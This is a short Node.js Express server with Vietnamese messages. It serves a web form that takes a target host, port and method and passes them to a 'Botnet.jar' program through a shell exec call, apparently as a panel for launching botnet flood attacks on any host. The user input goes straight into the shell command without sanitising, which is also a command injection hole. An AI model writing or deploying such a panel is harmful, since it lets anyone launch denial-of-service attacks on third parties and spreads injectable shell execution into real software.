const express = require('express');
const { exec } = require('child_process');
const path = require('path');

const app = express();
const PORT = 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Phục vụ file tĩnh trong thư mục public
app.use(express.static(path.join(__dirname, 'public')));

app.post('/submit', (req, res) => {
  const { host, port, method } = req.body;

  if (!host || !port || !method) {
    return res.status(400).send("❌ Vui lòng nhập đầy đủ Host, Port và chọn phương thức.");
  }

  const fullTarget = `${host}:${port}`;
  const cmd = `java -jar Botnet.jar ${fullTarget} 766 ${method} 300 9000`;

  console.log("👉 Chạy lệnh:", cmd);

  exec(cmd, { maxBuffer: 1024 * 1024 }, (err, stdout, stderr) => {
    let output = `✅ Đã chạy lệnh:\n${cmd}\n\n--- Kết quả ---\n`;

    if (stdout) output += stdout.trim() + "\n";
    if (stderr) output += "\n⚠️ Cảnh báo/ lỗi:\n" + stderr.trim() + "\n";

    if (err) {
      console.error("❌ Lỗi khi chạy lệnh:", err.message);
      output += `\n❌ Lỗi:\n${err.message}`;
      return res.status(500).send(output);
    }

    console.log("✅ Kết quả trả về:\n", stdout);
    res.send(output);
  });
});

app.listen(PORT, () => {
  console.log(`✅ Server chạy tại: http://localhost:${PORT}`);
});
